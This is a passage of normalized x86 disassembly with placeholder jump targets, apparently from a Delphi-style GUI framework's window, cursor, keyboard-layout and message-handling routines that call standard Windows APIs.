test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_44c3b8
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_4509a4
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46cb5c
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46afe8
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_45183c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_45191b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451922
lea eax [ ebp - 0x4 ]
call sub_404038
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_4530b8
mov dl [ ebx + 0x184 ]
call sub_457d68
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46af60
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_40810c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46ad60
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46ad60
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46ad60
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_451928
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4519b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4519b9
lea eax [ ebp - 0x4 ]
call sub_404038
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46af60
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_40810c
test eax eax
je r-xdata
mov eax ebx
call sub_4530b8
mov dl 0x1
call sub_457d4c
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_451a14
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_417274
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_44da78
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_451a64
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_451a98
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_4034a4
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_4034a4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_451ad8
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_44da78
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_451b30
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_421450
mov edx [ r-xdata ]
call sub_403458
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_451b68
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_4188d4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_451b8c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_4530b8
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_451be8
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_451b54
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_4188d4
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_451c28
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_40594c
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_40594c
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_451c94
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_451d3c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451d43
lea eax [ ebp - 0x4 ]
call sub_405934
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_44a4f8
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_4032a8
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_405934
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_4034a4
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_40594c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ edi + 0x178 ] eax
sub_451d4c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_44f950
xor edx edx
push ebp
push sub_451e0e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_4034a4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451e15
mov eax [ ebp - 0x4 ]
call sub_44f958
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_451e15
mov eax [ ebp - 0x4 ]
call sub_464294
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_44cad4
sub_451e60
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4031f0
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44e738
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_451eca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_4034a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_44cad4
sub_451ee4
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_451f0c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_464294
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_46417c
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_4034a4
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_451f0c
test al al
jne r-xdata
sub_451f74
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_451f0c
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_454224
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_451fa0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_451f0c
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_454224
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_451fcc
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_451ff4
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_464294
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_46417c
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_4034a4
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_451ff4
test al al
jne r-xdata
sub_45205c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_451ff4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45207c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_451ff4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4520bc
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_464294
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_4034a4
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_4520bc
test al al
jne r-xdata
sub_452120
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4520bc
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_452140
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44fde8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44fdac
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_44da78
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_452140
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_4521f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_452140
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_464294
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_44da78
test eax eax
jne r-xdata
sub_452298
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_450d38
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4522b8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_450d38
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4522ec
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_450d38
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45230c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_45235c
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_452380
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_44bb18
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_44fde8
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_44fdac
mov dl [ esp ]
mov si 0xffd1
call sub_4034a4
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_4523d8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_4034a4
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_4523fc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_4034a4
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_452434
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e54c
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_44fe48
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_450658
sub_45246c
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_4034a4
pop esi
pop ebx
retn
mov eax ebx
call sub_44cf08
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_4044f8
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_4044f8
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_4524ec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_450a38
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44e620
sub_45254c
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_4507ac
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_44fba8
pop ebx
retn
sub_45257c
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_4525a4
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_4533bc
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_44fba8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_452614
push ebx
mov ebx eax
mov eax ebx
call sub_44e48c
mov eax ebx
call sub_4533bc
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_44fe48
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_4244b8
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_44da78
sub_452650
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_44b0f8
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_4530b8
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_44da78
sub_452690
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4533bc
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4530b8
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4526d0
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_44fe48
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_4533bc
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_452fc0
sub_452710
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_4531f8
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_4531f8
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_452770
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_44d4d4
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_44c3b8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_4509a4
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_4527e0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e5c4
mov edx esi
mov eax ebx
call sub_44fe08
pop esi
pop ebx
retn
sub_4527fc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_449730
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_464294
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_4034a4
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_4034a4
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_4034a4
test al al
jne r-xdata
sub_452890
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_454224
mov edx esi
mov eax ebx
call sub_4527fc
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_44da78
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_44da78
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_44da78
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_464294
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_44da78
test eax eax
jne r-xdata
jmp r-xdata
sub_452974
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_44da78
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_4529c8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_44da78
test al 0x80
jne r-xdata
xor eax eax
